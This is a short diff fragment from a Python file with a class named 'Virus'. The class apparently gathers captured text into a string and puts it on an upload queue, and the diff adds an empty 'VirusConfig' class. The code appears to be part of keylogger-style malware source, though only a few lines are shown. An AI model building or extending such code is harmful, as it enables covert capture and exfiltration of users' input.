@@ -135,3 +135,6 @@ class Virus(object):
         textstr = "".join(self.texts)
         self.upload_queue.put(textstr)
         self.texts.clear()
+
+
+class VirusConfig:
